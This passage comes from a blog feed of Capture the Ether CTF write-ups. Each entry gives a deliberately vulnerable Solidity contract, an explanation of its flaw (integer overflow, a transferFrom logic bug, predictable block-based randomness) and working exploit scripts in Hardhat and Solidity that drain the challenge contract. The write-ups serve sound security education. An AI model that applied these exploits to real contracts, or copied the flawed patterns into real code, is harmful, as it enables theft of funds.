it looks easy to pass and no problems in it. after the <code>require</code>, allowance minus, it is also right. But <code>_transfer(to,value)</code> is wrong: We can see from the above analysis, <code>_transfer()</code> will minus msg.sender’s balance but now the from’s balances! It is a logical error.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function transferFrom(address from, address to, uint256 value) public &#123;</span><br><span class="line">    require(balanceOf[from] &gt;= value);</span><br><span class="line">    require(balanceOf[to] + value &gt;= balanceOf[to]);</span><br><span class="line">    require(allowance[from][msg.sender] &gt;= value);</span><br><span class="line"></span><br><span class="line">    allowance[from][msg.sender] -= value;</span><br><span class="line">    _transfer(to, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>this is the first possible attack thread:</p><p>1.The player has 1000 ETH at first, and then we can bring in another account “attacker” to collaborate together</p><p>2.player transfers 1000 ETH to attacker.【player: 0 ETH, attacker: 1000 ETH】</p><p>3.attacker approves player 1000 ETH.【allowance [msg.sender] [spender] = 1000】</p><p>4.player transferFrom() 1000 ETH to address(0)【because player 0 ETH , <code>_transfer()</code> will minus 1000 ETH from player but now attacker! It will cause an integer overflow】</p><h2 id="solution"><a href="#solution" class="headerlink" title="solution"></a>solution</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; expect &#125; <span class="keyword">from</span> <span class="string">&quot;chai&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; ethers &#125; <span class="keyword">from</span> <span class="string">&quot;hardhat&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_">describe</span>(<span class="string">&quot;TokenWhaleChallenge&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="title function_">it</span>(<span class="string">&quot;Solves the challenge&quot;</span>, <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="comment">//1.The player has 1000 ETH at first, and then we can bring in another account &quot;attacker&quot; to collaborate together</span></span><br><span class="line">    <span class="keyword">const</span> [player, attacker] = <span class="keyword">await</span> ethers.<span class="title function_">getSigners</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> playerAddress = <span class="keyword">await</span> player.<span class="title function_">getAddress</span>();</span><br><span class="line">    <span class="keyword">const</span> challengeFactory = <span class="keyword">await</span> ethers.<span class="title function_">getContractFactory</span>(<span class="string">&quot;TokenWhaleChallenge&quot;</span>);</span><br><span class="line">    <span class="comment">//【player: 1000 ETH】</span></span><br><span class="line">    <span class="keyword">const</span> challengeContract = <span class="keyword">await</span> challengeFactory.<span class="title function_">deploy</span>(playerAddress);</span><br><span class="line">    <span class="keyword">await</span> challengeContract.<span class="title function_">deployed</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//2.player transfers 1000 ETH to attacker.【player: 0 ETH, attacker: 1000 ETH】</span></span><br><span class="line">    <span class="keyword">const</span> transferTx = <span class="keyword">await</span> challengeContract.<span class="title function_">connect</span>(player).<span class="title function_">transfer</span>(attacker.<span class="property">address</span>, <span class="number">1000</span>);</span><br><span class="line">    <span class="keyword">await</span> transferTx.<span class="title function_">wait</span>();</span><br><span class="line">      </span><br><span class="line">    <span class="comment">//3.attacker approves player 1000 ETH.【allowance [msg.sender] [spender] = 1000】</span></span><br><span class="line">    <span class="keyword">const</span> approveTx = <span class="keyword">await</span> challengeContract.<span class="title function_">connect</span>(attacker).<span class="title function_">approve</span>(player.<span class="property">address</span>, <span class="number">1000</span>);</span><br><span class="line">    <span class="keyword">await</span> approveTx.<span class="title function_">wait</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//4.player transferFrom() 1000 ETH to address(0)【because player has 0 ETH , `_transfer()` will minus 1000 ETH from player but now attacker! It will cause an integer overflow】</span></span><br><span class="line">    <span class="keyword">const</span> transferFromTx = <span class="keyword">await</span> challengeContract</span><br><span class="line">      .<span class="title function_">connect</span>(player)</span><br><span class="line">      .<span class="title function_">transferFrom</span>(attacker.<span class="property">address</span>, <span class="string">&quot;0x0000000000000000000000000000000000000000&quot;</span>, <span class="number">1000</span>);</span><br><span class="line">    <span class="keyword">await</span> transferFromTx.<span class="title function_">wait</span>();</span><br><span class="line"></span><br><span class="line">    <span class="title function_">expect</span>(<span class="keyword">await</span> challengeContract.<span class="title function_">isComplete</span>()).<span class="property">to</span>.<span class="property">be</span>.<span class="property">true</span>;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 01.Capturetheether CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>07.Token sale</title>
      <link href="/2023/06/23/01.Capturetheether%20CTF/07.Token%20sale/"/>
      <url>/2023/06/23/01.Capturetheether%20CTF/07.Token%20sale/</url>
      
        <content type="html"><![CDATA[<h1 id="Token-sale"><a href="#Token-sale" class="headerlink" title="Token sale"></a>Token sale</h1><h2 id="topic"><a href="#topic" class="headerlink" title="topic"></a>topic</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract TokenSaleChallenge &#123;</span><br><span class="line">    mapping(address =&gt; uint256) public balanceOf;</span><br><span class="line">    uint256 constant PRICE_PER_TOKEN = 1 ether;</span><br><span class="line"></span><br><span class="line">    function TokenSaleChallenge(address _player) public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance &lt; 1 ether;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function buy(uint256 numTokens) public payable &#123;</span><br><span class="line">        require(msg.value == numTokens * PRICE_PER_TOKEN);</span><br><span class="line"></span><br><span class="line">        balanceOf[msg.sender] += numTokens;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function sell(uint256 numTokens) public &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;= numTokens);</span><br><span class="line"></span><br><span class="line">        balanceOf[msg.sender] -= numTokens;</span><br><span class="line">        msg.sender.transfer(numTokens * PRICE_PER_TOKEN);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="analyse"><a href="#analyse" class="headerlink" title="analyse"></a>analyse</h2><p>This is an integer overflow vulnerability. This is the vulnerability code: </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function buy(uint256 numTokens) public payable &#123;</span><br><span class="line">        require(msg.value == numTokens * PRICE_PER_TOKEN);</span><br><span class="line">        balanceOf[msg.sender] += numTokens;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>we should know that:</p><ul><li>1 ether equals 10^18</li><li>if numTokens larger than type(uint256).max, it will cause an integer overflow vulnerability</li><li>We have to get the maximum possible uint256 = 2^256 - 1, then divide it by 1 ether = 10^18.</li><li>Then, we add 1 to the maxUint256, to ensure that when multiplied by 1 ether(10^18), it causes an overflow.</li><li>Knowing that the overflow will happen, we need to know by how much in order to send the correct msg.value</li><li>We have established that: ((2^256/10^18) + 1) * 10^18 = overflow. So, msg.value needed = overflow - (type(uint256).max + 1) .</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msg.value == numTokens * PRICE_PER_TOKEN</span><br><span class="line">2^256 / 10^18 + 1 = 115792089237316195423570985008687907853269984665640564039458</span><br><span class="line">(2^256 / 10^18 + 1) * 10^18 - 2^256 = 415992086870360064 ~= 0.41 ETH</span><br></pre></td></tr></table></figure><h2 id="solution"><a href="#solution" class="headerlink" title="solution"></a>solution</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; expect &#125; <span class="keyword">from</span> <span class="string">&quot;chai&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; ethers &#125; <span class="keyword">from</span> <span class="string">&quot;hardhat&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> &#123; utils &#125; = ethers;</span><br><span class="line"></span><br><span class="line"><span class="title function_">describe</span>(<span class="string">&quot;TokenSaleChallenge&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="title function_">it</span>(<span class="string">&quot;Solves the challenge&quot;</span>, <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> myAddress = ethers.<span class="property">provider</span>.<span class="title function_">getSigner</span>().<span class="title function_">getAddress</span>();</span><br><span class="line">    <span class="keyword">const</span> challengeFactory = <span class="keyword">await</span> ethers.<span class="title function_">getContractFactory</span>(<span class="string">&quot;TokenSaleChallenge&quot;</span>);</span><br><span class="line">    <span class="keyword">const</span> challengeContract = <span class="keyword">await</span> challengeFactory.<span class="title function_">deploy</span>(myAddress, &#123;</span><br><span class="line">      <span class="attr">value</span>: utils.<span class="title function_">parseEther</span>(<span class="string">&quot;1&quot;</span>),</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">await</span> challengeContract.<span class="title function_">deployed</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// msg.value == numTokens * PRICE_PER_TOKEN</span></span><br><span class="line">    <span class="comment">// 2^256 / 10^18 + 1 = 115792089237316195423570985008687907853269984665640564039458</span></span><br><span class="line">    <span class="comment">// (2^256 / 10^18 + 1) * 10^18 - 2^256 = 415992086870360064 ~= 0.41 ETH</span></span><br><span class="line">    <span class="keyword">const</span> buyTx = <span class="keyword">await</span> challengeContract.<span class="title function_">buy</span>(<span class="string">&quot;115792089237316195423570985008687907853269984665640564039458&quot;</span>, &#123;</span><br><span class="line">      <span class="attr">value</span>: <span class="string">&quot;415992086870360064&quot;</span>,</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">await</span> buyTx.<span class="title function_">wait</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> sellTx = <span class="keyword">await</span> challengeContract.<span class="title function_">sell</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">await</span> sellTx.<span class="title function_">wait</span>();</span><br><span class="line"></span><br><span class="line">    <span class="title function_">expect</span>(<span class="keyword">await</span> challengeContract.<span class="title function_">isComplete</span>()).<span class="property">to</span>.<span class="property">be</span>.<span class="property">true</span>;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 01.Capturetheether CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>06.Predict the block hash</title>
      <link href="/2023/06/23/01.Capturetheether%20CTF/06.Predict%20the%20block%20hash/"/>
      <url>/2023/06/23/01.Capturetheether%20CTF/06.Predict%20the%20block%20hash/</url>
      
        <content type="html"><![CDATA[<h1 id="Predict-the-future"><a href="#Predict-the-future" class="headerlink" title="Predict the future"></a>Predict the future</h1><h2 id="topic"><a href="#topic" class="headerlink" title="topic"></a>topic</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract PredictTheBlockHashChallenge &#123;</span><br><span class="line">    address guesser;</span><br><span class="line">    bytes32 guess;</span><br><span class="line">    uint256 settlementBlockNumber;</span><br><span class="line"></span><br><span class="line">    function PredictTheBlockHashChallenge() public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance == 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function lockInGuess(bytes32 hash) public payable &#123;</span><br><span class="line">        require(guesser == 0);</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line"></span><br><span class="line">        guesser = msg.sender;</span><br><span class="line">        guess = hash;</span><br><span class="line">        settlementBlockNumber = block.number + 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function settle() public &#123;</span><br><span class="line">        require(msg.sender == guesser);</span><br><span class="line">        require(block.number &gt; settlementBlockNumber);</span><br><span class="line"></span><br><span class="line">        bytes32 answer = block.blockhash(settlementBlockNumber);</span><br><span class="line"></span><br><span class="line">        guesser = 0;</span><br><span class="line">        if (guess == answer) &#123;</span><br><span class="line">            msg.sender.transfer(2 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="analyse"><a href="#analyse" class="headerlink" title="analyse"></a>analyse</h2><p>this level is not impossible to brute force since it has 2^256 probabilities.</p><p>However, in both the Solidity compiler version 0.4.21 (for <code>block.blockhash()</code>) and ^0.8.0 (for <code>blockhash()</code>), the function to obtain the block hash from a block number only returns the hash for the 256 most recent blocks, excluding current.</p><p>From <a href="https://docs.soliditylang.org/en/v0.6.8/units-and-global-variables.html#block-and-transaction-properties">Solidity documentation</a>:</p><blockquote><p>The block hashes are not available for all blocks for scalability reasons. You can only access the hashes of the most recent 256 blocks, all other values will be zero.</p></blockquote><p>This means that after 256 + 1 blocks of locking our guess our “random” answer will be 0.</p><h2 id="solution"><a href="#solution" class="headerlink" title="solution"></a>solution</h2><ol><li>lock the number: Call <code>lockInGuess</code> with <code>0x0000000000000000000000000000000000000000000000000000000000000000</code></li><li>Wait for 257 blocks</li><li>Call <code>settle</code></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; expect &#125; <span class="keyword">from</span> <span class="string">&quot;chai&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; ethers &#125; <span class="keyword">from</span> <span class="string">&quot;hardhat&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> &#123; utils, provider &#125; = ethers;</span><br><span class="line"></span><br><span class="line"><span class="title function_">describe</span>(<span class="string">&quot;PredictTheBlockHashChallenge&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="title function_">it</span>(<span class="string">&quot;Solves the challenge&quot;</span>, <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> challengeFactory = <span class="keyword">await</span> ethers.<span class="title function_">getContractFactory</span>(<span class="string">&quot;PredictTheBlockHashChallenge&quot;</span>);</span><br><span class="line">    <span class="keyword">const</span> challengeContract = <span class="keyword">await</span> challengeFactory.<span class="title function_">deploy</span>(&#123; <span class="attr">value</span>: utils.<span class="title function_">parseEther</span>(<span class="string">&quot;1&quot;</span>) &#125;);</span><br><span class="line">    <span class="keyword">await</span> challengeContract.<span class="title function_">deployed</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> lockInGuessTx = <span class="keyword">await</span> challengeContract.<span class="title function_">lockInGuess</span>(</span><br><span class="line">      <span class="string">&quot;0x0000000000000000000000000000000000000000000000000000000000000000&quot;</span>,</span><br><span class="line">      &#123; <span class="attr">value</span>: utils.<span class="title function_">parseEther</span>(<span class="string">&quot;1&quot;</span>) &#125;,</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">await</span> lockInGuessTx.<span class="title function_">wait</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> initBlockNumber = <span class="keyword">await</span> provider.<span class="title function_">getBlockNumber</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> lastBlockNumber = initBlockNumber;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">      lastBlockNumber = <span class="keyword">await</span> provider.<span class="title function_">getBlockNumber</span>();</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Block number: <span class="subst">$&#123;lastBlockNumber&#125;</span>`</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">await</span> ethers.<span class="property">provider</span>.<span class="title function_">send</span>(<span class="string">&quot;evm_mine&quot;</span>, []);</span><br><span class="line">    &#125; <span class="keyword">while</span> (lastBlockNumber - initBlockNumber &lt; <span class="number">256</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> attackTx = <span class="keyword">await</span> challengeContract.<span class="title function_">settle</span>();</span><br><span class="line">    <span class="keyword">await</span> attackTx.<span class="title function_">wait</span>();</span><br><span class="line"></span><br><span class="line">    <span class="title function_">expect</span>(<span class="keyword">await</span> challengeContract.<span class="title function_">isComplete</span>()).<span class="property">to</span>.<span class="property">be</span>.<span class="property">true</span>;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 01.Capturetheether CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>05.Predict the future</title>
      <link href="/2023/06/23/01.Capturetheether%20CTF/05.Predict%20the%20future/"/>
      <url>/2023/06/23/01.Capturetheether%20CTF/05.Predict%20the%20future/</url>
      
        <content type="html"><![CDATA[<h1 id="Predict-the-future"><a href="#Predict-the-future" class="headerlink" title="Predict the future"></a>Predict the future</h1><h2 id="topic"><a href="#topic" class="headerlink" title="topic"></a>topic</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract PredictTheFutureChallenge &#123;</span><br><span class="line">    address guesser;</span><br><span class="line">    uint8 guess;</span><br><span class="line">    uint256 settlementBlockNumber;</span><br><span class="line"></span><br><span class="line">    function PredictTheFutureChallenge() public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance == 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function lockInGuess(uint8 n) public payable &#123;</span><br><span class="line">        require(guesser == 0);</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line"></span><br><span class="line">        guesser = msg.sender;</span><br><span class="line">        guess = n;</span><br><span class="line">        settlementBlockNumber = block.number + 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function settle() public &#123;</span><br><span class="line">        require(msg.sender == guesser);</span><br><span class="line">        require(block.number &gt; settlementBlockNumber);</span><br><span class="line"></span><br><span class="line">        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;</span><br><span class="line"></span><br><span class="line">        guesser = 0;</span><br><span class="line">        if (guess == answer) &#123;</span><br><span class="line">            msg.sender.transfer(2 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="analyse"><a href="#analyse" class="headerlink" title="analyse"></a>analyse</h2><p>This time the answer needs to be locked in first and can only be checked after a certain number of blocks have settled. However, the answer is only in the range of 0 to 9 because of the modulo 10 instruction:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;</span><br></pre></td></tr></table></figure><ol><li>if someone locked the answer, the other can’t guess again until he checks the answer</li><li>so we can locked the answer, and then check that whether the correct answer is the same as we locked or not. If it does, we call <code>settle()</code> and get money, otherwise we try again in the next block. No one can stop us to do this because we are alway the guesser until we call <code>settle()</code></li><li>So we should lock an answer to be the guesser, forecast the correct number and finally call settle() with the right number. u can use a loop to do this or forecast one by one.</li><li>we use <code>require</code> to prevent the tx from continuing, so if the right number is not the same as we locked it would revert and return the ETH.</li></ol><p>PS: because the correct number depends on <code>block.blockhash(block.number - 1)</code>, it means it will get the right number depends on the previous block hash, so we could only try once in each block.</p><h2 id="solution"><a href="#solution" class="headerlink" title="solution"></a>solution</h2><ul><li>assume that we lock the number “1”, of course u can select “0~9”</li><li>call attack() again an again until it calls successfully.</li></ul><p>if u dont want to call it one by one, u can use loop logic.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">function attack() public &#123;</span><br><span class="line">    // prevent the tx from continuing if the answer is not going to pass as correct</span><br><span class="line">    //this is the initial code in the website, it is out-of-date, so we use the newer code</span><br><span class="line">    //uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;</span><br><span class="line">    uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))) % 10;</span><br><span class="line">    </span><br><span class="line">    require(answer == 1, &quot;tx fail and waiting for the next block to try again&quot;);</span><br><span class="line"></span><br><span class="line">    // make the guess and check if the challenge is complete, otherwise revert</span><br><span class="line">    challenge.settle();</span><br><span class="line">    require(challenge.isComplete(), &quot;challenge not complete yet&quot;);</span><br><span class="line">    </span><br><span class="line">    // send funds to my address</span><br><span class="line">    (bool success,) = msg.sender.call&#123;value:address(this).balance&#125;(&quot;&quot;);</span><br><span class="line">    require(success, &quot;call failed&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 01.Capturetheether CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>04.Guess the new number</title>
      <link href="/2023/06/23/01.Capturetheether%20CTF/04.Guess%20the%20new%20number/"/>
      <url>/2023/06/23/01.Capturetheether%20CTF/04.Guess%20the%20new%20number/</url>
      
        <content type="html"><![CDATA[<h1 id="Guess-the-new-number"><a href="#Guess-the-new-number" class="headerlink" title="Guess the new number"></a>Guess the new number</h1><h2 id="topic"><a href="#topic" class="headerlink" title="topic"></a>topic</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract GuessTheNewNumberChallenge &#123;</span><br><span class="line">    function GuessTheNewNumberChallenge() public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance == 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function guess(uint8 n) public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line">        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));</span><br><span class="line"></span><br><span class="line">        if (n == answer) &#123;</span><br><span class="line">            msg.sender.transfer(2 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="analyses"><a href="#analyses" class="headerlink" title="analyses"></a>analyses</h2><p>the same as the article in my blog: [security-12]</p><h2 id="solution"><a href="#solution" class="headerlink" title="solution"></a>solution</h2><p>the same as the article in my blog: [security-12]</p>]]></content>
      
      
      <categories>
          
          <category> 01.Capturetheether CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>03.Guess the random number</title>
      <link href="/2023/06/23/01.Capturetheether%20CTF/03.Guess%20the%20random%20number/"/>
      <url>/2023/06/23/01.Capturetheether%20CTF/03.Guess%20the%20random%20number/</url>
      
        <content type="html"><![CDATA[<h1 id="Guess-the-random-number"><a href="#Guess-the-random-number" class="headerlink" title="Guess the random number"></a>Guess the random number</h1><h2 id="topic"><a href="#topic" class="headerlink" title="topic"></a>topic</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract GuessTheRandomNumberChallenge &#123;</span><br><span class="line">    uint8 answer;</span><br><span class="line"></span><br><span class="line">    function GuessTheRandomNumberChallenge() public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line">        answer = uint8(keccak256(block.blockhash(block.number - 1), now));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        